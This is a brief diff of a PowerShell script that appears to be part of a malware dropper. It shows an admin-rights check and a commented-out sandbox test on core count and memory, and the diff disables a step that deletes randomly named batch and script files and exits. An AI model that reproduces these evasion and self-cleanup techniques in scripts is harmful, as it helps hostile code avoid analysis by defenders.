@@ -19,11 +19,11 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 #     (Get-WmiObject Win32_Processor).NumberOfCores -lt 2 -or 
 #     (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4) {
 #     
-        Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
-        Remove-Item -Path "$initial_dir\IVbaANzwiphH.cmd"
-        Remove-Item -Path "$initial_dir\initial.cmd"
-        Remove-Item -Path "$initial_dir\nEQlCzTBpDrO.bat"
-        exit
+        # Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
+        # Remove-Item -Path "$initial_dir\IVbaANzwiphH.cmd"
+        # Remove-Item -Path "$initial_dir\initial.cmd"
+        # Remove-Item -Path "$initial_dir\nEQlCzTBpDrO.bat"
+        # exit
 # }
 
 Set-Variable -Name wd -Value (random_text)
